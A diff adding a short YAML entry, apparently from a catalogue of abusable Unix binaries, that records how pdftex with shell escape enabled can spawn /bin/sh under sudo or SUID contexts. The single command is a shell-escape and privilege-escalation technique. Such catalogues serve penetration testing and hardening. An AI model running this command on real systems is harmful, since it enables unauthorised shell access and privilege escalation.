@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      pdftex --shell-escape '\write18{/bin/sh}\end'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
